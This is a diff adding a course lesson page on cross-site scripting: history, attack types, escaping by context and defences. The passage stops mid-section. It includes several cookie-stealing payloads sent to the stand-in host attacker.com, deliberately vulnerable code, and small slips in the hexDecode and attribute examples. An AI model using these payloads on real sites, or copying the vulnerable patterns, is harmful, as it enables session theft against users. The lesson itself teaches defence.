@@ -1,0 +1,463 @@
+<h1 id="lesson-7-cross-site-scripting-xss">Lesson 7: Cross-Site
+Scripting (XSS)</h1>
+<h2 id="introduction">Introduction</h2>
+<p>In 2005, a 19-year-old programmer named Samy Kamkar discovered he
+could add custom JavaScript to his MySpace profile, bypassing the site’s
+security filters. He created what became the first major
+self-propagating cross-site scripting (XSS) worm. When users viewed his
+profile, the injected code would: 1. Add Samy as a friend 2. Add “but
+most of all, Samy is my hero” to their profile 3. Copy itself to their
+profile, attacking anyone who viewed it</p>
+<p>Within 20 hours, over one million MySpace users had unknowingly
+executed this code, adding Samy as a friend and spreading the worm to
+their own profiles. The exponential spread brought MySpace’s servers
+down and resulted in Kamkar’s arrest. Samy’s <a
+href="https://samy.pl/myspace/">account of the events</a> and <a
+href="https://samy.pl/myspace/tech.html">technical explanation</a> are
+worth a read.</p>
+<p>Thirteen years later, attackers exploited this same class of
+vulnerability against British Airways’ payment website. By injecting
+just 22 lines of malicious JavaScript into the payment form, they
+silently captured credit card numbers, names, and CVV codes during
+checkout, sending them to a lookalike domain. The attack went undetected
+for 15 days and compromised 380,000 transactions, leading to a £20M GDPR
+fine.</p>
+<p>Cross-site scripting can affect any system that deals with untrusted
+user input. Such attacks appear in places you might least expect; for
+example, a security researcher <a
+href="https://www.securityweek.com/tesla-awards-researcher-10000-after-finding-xss-vulnerability/">gained
+access to internal Tesla support tools after including JavaScript in his
+car’s name</a>. Understanding how to prevent XSS is crucial for anyone
+building for the web.</p>
+<h2 id="how-xss-works">How XSS Works</h2>
+<p>Cross-Site Scripting occurs when attackers can inject malicious
+JavaScript code into webpages that other users will view. Consider a
+webpage that displays a user’s username:</p>
+<div class="sourceCode" id="cb1"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Server code</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/profile&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> username <span class="op">=</span> <span class="fu">getUsername</span>()<span class="op">;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;h1&gt;Welcome back!&lt;/h1&gt;</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;div&gt;Username: </span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">&lt;/div&gt;</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="vs">  `</span>)<span class="op">;</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>If an attacker can control the username value, they could inject
+JavaScript:</p>
+<div class="sourceCode" id="cb2"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> username <span class="op">=</span> <span class="st">&#39;&lt;/div&gt;&lt;script&gt;alert(&quot;hacked!&quot;)&lt;/script&gt;&lt;div&gt;&#39;</span><span class="op">;</span></span></code></pre></div>
+<p>This breaks out of the intended HTML structure and injects a new
+script tag. When other users view this profile, their browsers execute
+the injected code in the context of the page. This gives the attacker
+access to:</p>
+<ul>
+<li>The user’s cookies and session data for that site (enabling session
+hijacking)</li>
+<li>Any sensitive information displayed on the page (credit card
+numbers, private messages, etc.)</li>
+<li>The ability to make requests to the site with the user’s
+credentials</li>
+<li>The DOM, allowing modification of what the user sees</li>
+<li>Access to the user’s webcam, location, and other sensitive browser
+APIs (if the site has permission)</li>
+</ul>
+<p>For example, if an attacker can inject this code into a page, they
+will steal the cookies of any user who executes this:</p>
+<div class="sourceCode" id="cb3"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="fu">fetch</span>(<span class="st">&#39;https://attacker.com/steal?cookie=&#39;</span> <span class="op">+</span> <span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="op">;</span></span></code></pre></div>
+<h2 id="types-of-xss">Types of XSS</h2>
+<h3 id="reflected-xss">Reflected XSS</h3>
+<p>Reflected XSS happens when the server immediately echoes malicious
+input back to the user. This typically occurs in search features, error
+messages, or other responses that include user input.</p>
+<p>Example vulnerability:</p>
+<div class="sourceCode" id="cb4"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Search feature that displays the search query</span></span>
+<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/search&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> query <span class="op">=</span> req<span class="op">.</span><span class="at">query</span><span class="op">.</span><span class="at">q</span><span class="op">;</span></span>
+<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`&lt;h1&gt;Search results for </span><span class="sc">${</span>query<span class="sc">}</span><span class="vs">&lt;/h1&gt;`</span>)<span class="op">;</span></span>
+<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>Attack: 1. Attacker crafts a malicious URL:
+<code>https://example.com/search?q=&lt;script&gt;alert('xss')&lt;/script&gt;</code>
+2. Attacker sends link to victim (via email, message, etc.) 3. Victim
+clicks link, sending the payload to the server 4. Server reflects
+payload back in the response 5. Victim’s browser executes the script</p>
+<h3 id="stored-xss">Stored XSS</h3>
+<p>In stored XSS (also called persistent XSS), the malicious script is
+permanently stored on the target server (e.g., in a database) and served
+to multiple victims. For example, this discussion forum code is
+vulnerable:</p>
+<div class="sourceCode" id="cb5"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Server code - storing a comment</span></span>
+<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">post</span>(<span class="st">&#39;/comments&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> comment <span class="op">=</span> req<span class="op">.</span><span class="at">body</span><span class="op">.</span><span class="at">comment</span><span class="op">;</span></span>
+<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Vulnerability: comment stored without sanitization</span></span>
+<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a>  db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">insert</span>(comment)<span class="op">;</span></span>
+<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span>
+<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Server code - displaying comments</span></span>
+<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>app<span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;/post/:id&#39;</span><span class="op">,</span> (req<span class="op">,</span> res) <span class="kw">=&gt;</span> {</span>
+<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> comments <span class="op">=</span> db<span class="op">.</span><span class="at">comments</span><span class="op">.</span><span class="fu">findByPostId</span>(req<span class="op">.</span><span class="at">params</span><span class="op">.</span><span class="at">id</span>)<span class="op">;</span></span>
+<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a>  <span class="co">// Vulnerability: comments inserted directly into HTML</span></span>
+<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>  res<span class="op">.</span><span class="fu">send</span>(<span class="vs">`</span></span>
+<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;h1&gt;Post&lt;/h1&gt;</span></span>
+<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;div class=&quot;comments&quot;&gt;</span></span>
+<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a><span class="vs">      </span><span class="sc">${</span>comments<span class="op">.</span><span class="fu">map</span>(c <span class="kw">=&gt;</span> <span class="vs">`&lt;div&gt;</span><span class="sc">${</span>c<span class="sc">}</span><span class="vs">&lt;/div&gt;`</span>)<span class="op">.</span><span class="fu">join</span>(<span class="st">&#39;&#39;</span>)<span class="sc">}</span></span>
+<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a><span class="vs">    &lt;/div&gt;</span></span>
+<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a><span class="vs">  `</span>)<span class="op">;</span></span>
+<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>})<span class="op">;</span></span></code></pre></div>
+<p>An attacker could post a comment containing malicious JavaScript.
+Anyone viewing the post would execute this code, even long after the
+attack was planted. This makes stored XSS particularly dangerous.</p>
+<h3 id="dom-based-xss">DOM-based XSS</h3>
+<p>DOM-based XSS occurs client-side, when JavaScript on the page
+processes data from an untrusted source (like the URL) and writes it to
+a dangerous DOM sink (like innerHTML). Example:</p>
+<div class="sourceCode" id="cb6"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Client-side JavaScript</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="co">// Get &#39;name&#39; from URL: https://example.com/page?name=Bob</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> name <span class="op">=</span> <span class="kw">new</span> <span class="fu">URL</span>(location<span class="op">.</span><span class="at">href</span>)<span class="op">.</span><span class="at">searchParams</span><span class="op">.</span><span class="fu">get</span>(<span class="st">&#39;name&#39;</span>)<span class="op">;</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="co">// Vulnerability: writing URL data directly to innerHTML</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="bu">document</span><span class="op">.</span><span class="fu">getElementById</span>(<span class="st">&#39;greeting&#39;</span>)<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="st">&#39;Hello, &#39;</span> <span class="op">+</span> name<span class="op">;</span></span></code></pre></div>
+<p>An attacker could exploit this with a URL like:</p>
+<pre><code>https://example.com/page?name=&lt;img src=x onerror=alert(&#39;xss&#39;)&gt;</code></pre>
+<p>The vulnerability exists entirely in the frontend JavaScript - the
+server might not even be involved.</p>
+<h2 id="beware-untrusted-data">Beware Untrusted Data</h2>
+<p>XSS vulnerabilities occur when untrusted data (potentially controlled
+by an attacker) makes its way into webpage content. Common sources
+include:</p>
+<ul>
+<li>URL parameters: Attackers can craft malicious links,
+e.g. <code>example.com/search?q=&lt;script&gt;fetch('https://attacker.com/steal?c='+document.cookie)&lt;/script&gt;</code></li>
+<li>Form fields: Any user input could contain script tags or malicious
+attributes</li>
+<li>User-generated content: Comments, posts, and profiles are common XSS
+vectors</li>
+</ul>
+<p>However, you must take care with <em>any</em> data that may be
+controlled by an untrusted third party. This includes data that may not
+come from a typical web page, such as <a
+href="https://hackerone.com/reports/409850">in-game chat messages</a>,
+<a
+href="https://www.securityweek.com/tesla-awards-researcher-10000-after-finding-xss-vulnerability/">car
+configuration</a>, and <a
+href="https://bugs.kde.org/show_bug.cgi?id=423020">WiFi network
+names</a>.</p>
+<p>The attack payload may not even be text. For example, imagine a
+website that processes driver’s license photos using OCR (Optical
+Character Recognition) to extract the name and other fields. If an
+attacker uploads an image of a fake license with XSS code where the
+driver’s name should be, they might be able to execute JavaScript when
+an administrator views the extracted data.</p>
+<h2 id="xss-contexts">XSS Contexts</h2>
+<p>The XSS payload might come from anywhere, but XSS only happens when
+improperly <em>displaying</em> untrusted data. The proper method for
+avoiding XSS depends on the context in which we are trying to use
+untrusted data.</p>
+<h3 id="html-content-context">HTML Content Context</h3>
+<p>This is when data appears between HTML tags, as text content.
+Browsers will parse any HTML tags or entities in this context.</p>
+<p>Example vulnerability:</p>
+<div class="sourceCode" id="cb8"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> username <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div&gt;Hello, </span><span class="sc">${</span>username<span class="sc">}</span><span class="vs">!&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
+<p>If the user input is the following string:</p>
+<pre><code>&lt;script&gt;fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie)&lt;/script&gt;</code></pre>
+<p>Then the browser will render this HTML:</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="dt">&gt;</span>Hello, <span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span><span class="fu">fetch</span>(<span class="st">&#39;https://attacker.com/steal?c=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span>!<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>To prevent XSS in this context, we need to escape special characters
+that could be interpreted as HTML or <a
+href="https://www.w3schools.com/html/html_entities.asp">HTML
+entities</a>:</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">escapeHtml</span>(unsafe) {</span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> unsafe</span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&amp;/g</span><span class="op">,</span> <span class="st">&#39;&amp;amp;&#39;</span>)    <span class="co">// Must be first to avoid double-escaping</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&lt;/g</span><span class="op">,</span> <span class="st">&#39;&amp;lt;&#39;</span>)</span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="op">/&gt;/</span>g<span class="op">,</span> <span class="st">&#39;&amp;gt;&#39;</span>)<span class="op">;</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Usage</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div&gt;Hello, </span><span class="sc">${</span><span class="fu">escapeHtml</span>(username)<span class="sc">}</span><span class="vs">!&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
+<h3 id="html-attribute-context">HTML Attribute Context</h3>
+<p>This is when data appears within HTML attributes. The challenge here
+is preventing attackers from breaking out of the attribute value and
+injecting new attributes or tags.</p>
+<p>Example vulnerability:</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userTheme <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div class=&quot;</span><span class="sc">${</span>userTheme<span class="sc">}</span><span class="vs">&quot;&gt;Hello&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
+<p>If the user input is the following string:</p>
+<pre><code>dark&quot; onmouseover=&quot;fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie)</code></pre>
+<p>Then the browser will render this HTML:</p>
+<div class="sourceCode" id="cb14"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> class</span><span class="op">=</span><span class="st">&quot;dark&quot;</span><span class="ot"> onmouseover</span><span class="op">=</span><span class="st">&quot;fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie)&quot;</span><span class="dt">&gt;</span>Hello<span class="dt">&lt;/</span><span class="kw">div</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>Proper handling requires both escaping and always using quotes:</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">escapeHtmlAttribute</span>(unsafe) {</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>  <span class="cf">return</span> unsafe</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&amp;/g</span><span class="op">,</span> <span class="st">&#39;&amp;amp;&#39;</span>)</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&#39;/g</span><span class="op">,</span> <span class="st">&#39;&amp;apos;&#39;</span>)</span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>    <span class="op">.</span><span class="fu">replace</span>(<span class="ss">/&quot;/g</span><span class="op">,</span> <span class="st">&#39;&amp;quot;&#39;</span>)<span class="op">;</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a><span class="co">// Usage - always quote attributes!</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>element<span class="op">.</span><span class="at">innerHTML</span> <span class="op">=</span> <span class="vs">`&lt;div class=&quot;</span><span class="sc">${</span><span class="fu">escapeHtmlAttribute</span>(userColor)<span class="sc">}</span><span class="vs">&quot;&gt;Hello&lt;/div&gt;`</span><span class="op">;</span></span></code></pre></div>
+<p><strong>Gotcha #1:</strong> For most attributes, escaping values is
+sufficient. However, beware special attributes like <code>src</code> and
+<code>href</code>. For example,
+<code>&lt;script src='USER_DATA_HERE'&gt;&lt;/script&gt;</code> is never
+safe, even if you escape the attribute value. Attacker-supplied <a
+href="https://developer.mozilla.org/en-US/docs/Web/URI/Schemes/javascript"><code>javascript:</code></a>,
+<a
+href="https://developer.mozilla.org/en-US/docs/Web/URI/Schemes/data"><code>data:</code></a>,
+and <code>file:</code> URLs can be particularly dangerous here.</p>
+<p><strong>Gotcha #2:</strong> Untrusted input needs additional
+sanitization in <code>on*</code> attributes. For example, the following
+code is vulnerable:</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> onmouseover</span><span class="op">=</span><span class="st">&#39;handleHover(USER_DATA_HERE)&#39;</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>If the user data is <code>); alert(document.cookie</code>, then the
+resulting HTML will be
+<code>&lt;div onmouseover='handleHover(); alert(document.cookie)'&gt;</code>.
+Additional characters must be escaped in this context.</p>
+<h3 id="javascript-context">JavaScript Context</h3>
+<p>This is when data needs to be embedded within JavaScript code. This
+context is particularly dangerous because it is hard to safely and
+reliably escape JavaScript in the context of an HTML file.</p>
+<p>Example vulnerability:</p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userName <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> script <span class="op">=</span> <span class="vs">`</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;script&gt;</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a><span class="vs">    const user = &quot;</span><span class="sc">${</span>userName<span class="sc">}</span><span class="vs">&quot;;</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    showGreeting(user);</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;/script&gt;</span></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a><span class="vs">`</span><span class="op">;</span></span></code></pre></div>
+<p>If the user input is the following string:</p>
+<pre><code>&quot;; fetch(&#39;https://attacker.com/steal?c=&#39;+document.cookie); &quot;</code></pre>
+<p>Then the browser will render this HTML:</p>
+<div class="sourceCode" id="cb19"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>  <span class="kw">const</span> user <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">;</span> <span class="fu">fetch</span>(<span class="st">&#39;https://attacker.com/steal?c=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span>)<span class="op">;</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a>  <span class="fu">showGreeting</span>(user)<span class="op">;</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>One way to safely embed user data is to encode it using hexadecimal
+or base64, embed the encoded string into the script context, and then
+decode the string from within the script. For example:</p>
+<div class="sourceCode" id="cb20"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userName <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> script <span class="op">=</span> <span class="vs">`</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;script&gt;</span></span>
+<span id="cb20-4"><a href="#cb20-4" aria-hidden="true" tabindex="-1"></a><span class="vs">    const user = hexDecode(&quot;</span><span class="sc">${</span><span class="fu">hexEncode</span>(userName)<span class="sc">}</span><span class="vs">)&quot;;</span></span>
+<span id="cb20-5"><a href="#cb20-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    showGreeting(user);</span></span>
+<span id="cb20-6"><a href="#cb20-6" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;/script&gt;</span></span>
+<span id="cb20-7"><a href="#cb20-7" aria-hidden="true" tabindex="-1"></a><span class="vs">`</span><span class="op">;</span></span></code></pre></div>
+<p>Alternatively, you can use a <a
+href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/template"><code>&lt;template&gt;</code>
+tag</a> to store data that won’t visibly render, using HTML element
+escaping rules, and then fetch the contents from within JavaScript:</p>
+<div class="sourceCode" id="cb21"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> userName <span class="op">=</span> <span class="fu">getUserInput</span>()<span class="op">;</span></span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true" tabindex="-1"></a><span class="kw">const</span> html <span class="op">=</span> <span class="vs">`</span></span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;template id=&#39;username&#39;&gt;</span><span class="sc">${</span><span class="fu">escapeHtml</span>(userName)<span class="sc">}</span><span class="vs">&lt;/template&gt;</span></span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;script&gt;</span></span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true" tabindex="-1"></a><span class="vs">    const user = document.getElementById(&#39;username&#39;).textContent;</span></span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true" tabindex="-1"></a><span class="vs">    showGreeting(user);</span></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true" tabindex="-1"></a><span class="vs">  &lt;/script&gt;</span></span></code></pre></div>
+<h3 id="never-safe-contexts">Never-Safe Contexts</h3>
+<p>Some contexts are inherently unsafe and should never include
+untrusted data:</p>
+<div class="sourceCode" id="cb22"><pre
+class="sourceCode html"><code class="sourceCode html"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Direct script content --&gt;</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">script</span><span class="dt">&gt;</span>USER_DATA_HERE<span class="dt">&lt;/</span><span class="kw">script</span><span class="dt">&gt;</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- HTML comments --&gt;</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- USER_DATA_HERE --&gt;</span></span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Tag names --&gt;</span></span>
+<span id="cb22-8"><a href="#cb22-8" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">USER_DATA_HERE</span><span class="ot"> href</span><span class="op">=</span><span class="st">&quot;/foo&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb22-9"><a href="#cb22-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-10"><a href="#cb22-10" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- Attribute names --&gt;</span></span>
+<span id="cb22-11"><a href="#cb22-11" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">div</span><span class="ot"> USER_DATA_HERE</span><span class="op">=</span><span class="st">&quot;value&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb22-12"><a href="#cb22-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-13"><a href="#cb22-13" aria-hidden="true" tabindex="-1"></a><span class="co">&lt;!-- CSS --&gt;</span></span>
+<span id="cb22-14"><a href="#cb22-14" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">style</span><span class="dt">&gt;</span>USER_DATA_HERE<span class="dt">&lt;/</span><span class="kw">style</span><span class="dt">&gt;</span></span></code></pre></div>
+<p>These contexts are particularly dangerous because there are too many
+ways for attackers to break out of them, making proper escaping
+virtually impossible.</p>
+<h2 id="defense-best-practices">Defense Best Practices</h2>
+<h3 id="escape-at-render-time">1. Escape at Render Time</h3>
+<p>Always escape data when rendering, not when storing or processing.
+This ensures: - Data is escaped properly for its context - Raw data is
+preserved in the database - Multiple output formats can be supported</p>
+<div class="sourceCode" id="cb23"><pre
+class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="co">// Bad - escaping at storage time</span></span>
